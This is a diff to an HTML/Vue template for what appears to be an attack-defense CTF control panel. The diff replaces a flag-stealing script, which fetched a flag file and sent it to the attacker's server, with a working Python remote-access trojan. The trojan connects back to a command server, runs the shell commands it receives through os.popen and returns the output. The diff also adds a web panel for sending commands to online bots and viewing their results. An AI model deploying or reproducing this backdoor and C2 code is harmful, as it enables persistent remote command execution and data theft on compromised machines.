@@ -1,10 +1,27 @@
 <div class="am-form" id ="pony-box">
     <ul class="am-avg-sm-7 am-thumbnails pony-box">
-        <li v-for="item in recent">
+
+    <div class="am-form-group">
+        <label for="pc_src">指令</label>
+        <textarea id="txt_run" rows="7" v-model="cmd"></textarea>
+        <button id="btn_run" v-on:click="run">执行</button>
+    </div>
+
+    <div class="am-form-group">
+        <label for="pc_src">反馈</label>
+        <ul>
+            <li v-for="item in cmd_results">
+                <p>IP:{{item[0]}}</p>
+                <pre>{{item[1]}}</pre>
+            </li>
+        </ul>
+    </div>
+
+    当前在线：
+    <ul>
+        <li v-for="item in items">
             <div>
-                {{ item.ip }}<br>
-                {{ item.key }}<br>
-                {{ item.tip }}
+                {{ item }}<br>
             </div>
         </li>
     </ul>
@@ -12,35 +29,54 @@
     <div class="am-form-group">
         <label for="pc_src">定时心跳+回报flag脚本</label>
         <textarea id="pc_src" debounce="500" v-model="source" rows="7">
+import os, json, zlib, time, socket
 
-import zlib, time, urllib2, base64
+sock = None
 
-a = 'http://10.0.0.2:8080/ichuqiu.flag'
-b = 'http://${config.SPEC['SERV_HOST']}:${config.PORT}/k?c='
+def connect():
+    global sock
+    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    sock.connect(('${config.SPEC['SERV_HOST']}', 8887))
 
-def f():
-    try:return urllib2.urlopen(a).read()
-    except:pass
+def send(data):
+    raw = zlib.compress(json.dumps(data))
+    sock.send('%d\n%s' % (len(raw), raw))
 
-def s(i):
-    try: return urllib2.urlopen(b+base64.b64encode(zlib.compress(i)))
-    except:pass
+def recv_until(sock, ch):
+    data = []
+    while True:
+        r = sock.recv(1)
+        if r != ch:
+            if r.isdigit():
+                data.append(r)
+            else:
+                print(ord(r))
+                data = []
+                time.sleep(3)
+        else: break
+    return ''.join(data)
 
-import os
+while True:
+    try:
+        connect()
+        send({'msg': 'online'})
 
-pid = int(os.getpid())
+        while True:
+            dlen = recv_until(sock, '\n')
+            raw = sock.recv(int(dlen))
+            data = json.loads(zlib.decompress(raw))
 
-def _do_wtf():
-    r = f()
-    if r: s(r)
-    time.sleep(60)
-
-def daemon():
-    pid = os.fork()
-    if pid != 0: os._exit(0)
-    while 1: _do_wtf()
-
-daemon()</textarea>
+            print(data)
+            if data['msg'] == 'cmd':
+                ret = os.popen(data['data']).read()
+                send({'msg': 'cmd_result', 'data': ret})
+            time.sleep(1)
+    except:
+        time.sleep(5)
+        print('reconnecting ...')
+    finally:
+        sock.close()
+</textarea>
     </div>
 
     <div class="am-form-group">
@@ -89,28 +125,6 @@ def daemon():
 daemon()</textarea>
     </div>
 
-    <div class="am-form-group">
-        <label for="pc_src">一句话：自动删文件</label>
-        <textarea id="pc_src" debounce="500" rows="3">{{ one_line2 }}</textarea>
-    </div>
-
-    <div class="am-form-group">
-        <label for="pc_src">新增</label>
-        <textarea id="txt_new" debounce="500" rows="7"></textarea>
-    </div>
-
-    <div class="am-form-group">
-        <label for="pc_src">断开</label>
-        <textarea id="txt_lost" debounce="500" rows="7"></textarea>
-    </div>
-
-    % if False:
-    <div class="am-form-group">
-        <label for="pc_src">源码</label>
-        <textarea id="pc_src" debounce="500" v-model="source" rows="7"></textarea>
-    </div>
-    % endif
-
 </div>
 
 <%block name="script">
@@ -131,6 +145,16 @@ daemon()</textarea>
                 one_line: the_data.one_line,
                 source2: the_data.source2,
                 one_line2: the_data.one_line2,
+                items: [],
+                cmd: '',
+                cmd_results: [],
+            },
+            methods: {
+                run: function () {
+                    $.get("${ url_for("j_rat_cmd") }", {'cmd': this.cmd}, function(ret) {
+                        demo.$set('cmd', '');
+                    });
+                }
             },
             watch: {
                 source: function (val, oldVal) {
@@ -151,21 +175,19 @@ daemon()</textarea>
         });
 
         setInterval(function() {
-            $.get("${ url_for("j_flag_info") }", function(ret) {
-                while (recent.pop()) ;
-                while (lost.pop()) ;
-                while (_new.pop()) ;
-                for (var i in ret.recent) recent.push(ret.recent[i]);
-                for (var i in ret.lost) {
-                    lost.push(ret.lost[i]);
-                    $("#txt_lost").val($("#txt_lost").val() + '\n' + ret.lost[i].key + ' ' + ret.lost[i].ip);
-                }
-                for (var i in ret.new) {
-                    _new.push(ret.new[i]);
-                    $("#txt_new").val($("#txt_new").val() + '\n' + ret.new[i].key + ' ' + ret.new[i].ip);
+            $.get("${ url_for("j_rat_info") }", function(ret) {
+                demo.$set('items', ret.data);
+            });
+        }, 1000);
+
+        setInterval(function() {
+            $.get("${ url_for("j_rat_cmd_result") }", function(ret) {
+                for (var i in ret.data) {
+                    demo.cmd_results.splice(0, 0, ret.data[i]);
                 }
             });
-        }, 3000);
+        }, 1000);
+
 	})();
 </script>
 </%block>
